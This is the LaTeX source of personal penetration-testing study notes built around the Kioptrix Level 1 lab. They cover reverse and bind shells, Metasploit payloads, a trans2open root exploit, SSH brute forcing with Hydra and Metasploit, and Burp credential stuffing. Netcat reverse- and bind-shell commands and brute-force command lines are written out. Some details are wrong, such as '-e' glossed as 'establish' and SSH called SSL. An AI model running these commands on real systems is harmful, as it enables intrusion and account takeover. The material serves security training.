\documentclass[11pt,a4paper]{article}
\usepackage[utf8]{inputenc}
\usepackage{amsmath}
\usepackage{amsfonts}
\usepackage{amssymb}
\usepackage{graphicx}
\usepackage[left=2cm,right=2cm,top=2cm,bottom=2cm]{geometry}
\usepackage{multicol}

\usepackage[table]{xcolor}

\usepackage{tikz}
\usetikzlibrary{arrows, automata, positioning, calc, through, angles, quotes, intersections}
\usepackage{pgfplots}

\author{Iker M. Canut}
\begin{document}
\title{Exploitation}
\maketitle
\newpage

\section{Shells}
\subsection{Reverse Shell}
\begin{center}
\tikzstyle{int}=[draw, fill=blue!20, minimum size=2em]
\tikzstyle{init} = [pin edge={to-,thin,black}]
\begin{tikzpicture}[auto,>=latex']
    \node [int, pin={[init]above:Attackbox}, node distance=10cm] (a) {$192.168.1.1$};
    \node [int, pin={[init]above:Target}] (c) [right of=a, node distance=10cm] {$192.168.1.2$};
    \node [below of=a, node distance=1cm] {nc -nvlp 4444};
    \node [below of=c, node distance=1cm] {nc 192.168.1.1 4444 -e /bin/sh};
    \path [->] (c) edge node {TCP Connection port 4444} (a);
\end{tikzpicture}
\end{center}
This means that a victim connects to the attacker. It is the most common way to pop a shell. \textbf{-nvlp} in netcat means Don't perform DNS lookups on names of machines on the other side, be Verbose, Listining mode, local Port. \textbf{-e} is for establish, \textbf{/bin/sh} is for a Linux shell, \textbf{command.exe} for a Windows terminal.

\subsection{Bind Shell}
\begin{center}
\tikzstyle{int}=[draw, fill=blue!20, minimum size=2em]
\tikzstyle{init} = [pin edge={to-,thin,black}]
\begin{tikzpicture}[auto,>=latex']
    \node [int, pin={[init]above:Attackbox}, node distance=10cm] (a) {$192.168.1.1$};
    \node [int, pin={[init]above:Target}] (c) [right of=a, node distance=10cm] {$192.168.1.2$};
    \node [below of=a, node distance=1cm] {nc 192.168.1.2 4444};
    \node [below of=c, node distance=1cm] {nc -nvlp 4444 -e /bin/sh};
    \path [->] (a) edge node {TCP Connection port 4444} (c);
\end{tikzpicture}
\end{center}
The attacker connects to the victim. We fire off an exploit that opens a port in the victim's computer, and it's waiting for us to connect. Bind shells are most likely to be on an external assessment.

\section{Payloads}
When we run an exploit, it's called payload. These payloads are what we send to a victim and attempt to get a shell on the machine.
\begin{table}[h]
\centering
\begin{tabular}{|c|c|}
\hline
\cellcolor{blue!20} NON-STAGED & \cellcolor{blue!20} STAGED\\
\hline
Sends exploit shellcode all at once. & Sends payload in stages.\\
\hline
Larger in size and won't always work. & Can be less stable.\\
\hline
Example: & Example:\\
windows/meterpreter\_reverse\_tcp & windows/meterpreter/reverse\_tcp\\
\hline
\end{tabular}
\end{table}
Understand that if you have a payload that does not work, try the other type of payload. You can try \textbf{reverse shell} or \textbf{bind shell}, with \textbf{staged payload} or \textbf{non-staged payload}.

\section{Gaining Root with Metasploit}
If we remember from Kioptrix Level 1, we got a SMB 2.2.1a. So let's start finding the exploit: \textbf{searchsploit samba 2.2}. We see again the 'trans2open'. So we're going to open up \textbf{msfconsole} and \textbf{search trans2open}. It lists all the Operating Systems available, but we know it's Linux, so we \textbf{use 1} and type \textbf{options} to see what else we need to complete. In this case, \textbf{set rhosts [IP]}. Then you could \textbf{show targets}, it will be a good practice. And finally, \textbf{exploit} or \textbf{run}.\\

Problem is, it opens a session but as soon as it opens it, it gets closed. Let's see, first it tries the addresses, then it finds the one that works and sends the stage (THIS IS A GOOD SIGN). After that, it says "Hey, I opened this session", but finally dies. It tries again but it keeps dying.\\

So we type options and we see that the payload is \textit{linux/x86/meterpreter/reverse\_tcp}... It's a staged payload. The first time didn't show up, but Metasploit understood that it didn't work the first time, so the problem might be the payload. LHOST is us, LPORT is our port. In real life, you should change the LPORT, 4444 is the default.\\

So we change the payload: \textbf{set payload linux/x86/shell\_reverse\_tcp} and \textbf{run} it again. And finally, we are root, we own this machine. 

\section{Gaining Root without Metasploit}
For example, to exploit the OpenLuck vulnerability of the Kioptrix Level 1, we could download the OpenLuck exploit from Github, compile it and run it. Pretty straighforward, just follow the instructions. We'll cover manual exploitation later.\\

\section{Brute Force Attacks - SSH}
SSL exploitation is not a low hanging fruit. If you want to attack it, from a realistic point of view, you should try weak or default credentials. Then you assess:
\begin{enumerate}
\item To check password strength.
\item Know if you can get in with default credentials.
\item See how well the blue team performs. Will they know you're brute-forcing the login? Maybe an alert?
\end{enumerate}
You could be as loud as it gets, it's not a red team assessment, where we try to be quiet. Hopefully we will get caught.

\subsection{Hydra}
The syntaxis is as follows: \textbf{hydra -l root -P /usr/share/wordlists/metasploit/unix\_passwords.txt ssh://[IP]:[PORT] -t 4 -V}. Where \textbf{-l} is for the user that we're gonna be utilizing (e.g root), \textbf{-P} for the password list, port generally is 22, \textbf{-t} is for the threads, \textbf{-V} is for verbosity.

\subsection{Metasploit}
If you want to run the same task in Metasploit, you could search \textbf{ssh}, and look for the auxiliary ssh login module. \textbf{use auxiliary/scanner/ssh/ssh\_login}. Then fill in the \textbf{options}. \textbf{set username root}. \textbf{set pass\_file /usr/share/wordlist/metasploit/unix\_password.txt}. \textbf{set rhosts [IP]}. \textbf{set threads 10}. \textbf{set verbose true}. Finally \textbf{run}.

\section{Credential Stuffing and Password Spraying}
If we go to a login form, we can intercept the packages with Burp Suite. Then, we can send it to intruder, clear the \$ and select the mail and password (or user and password). The attack type is pitchfork (but if we have only one parameter, we should choose the sniper attack). After that, we go to the payload section and throw the lists. We can now begin the attack. An interesting thing to look at, is the status code and the length of the package. Or set up in the \textit{Options} $>$ \textit{Grep} a new filter.\\

\noindent Password spraying is the art of using known usernames without a known password. You hardcode a possible password and try a list of mails.



\end{document}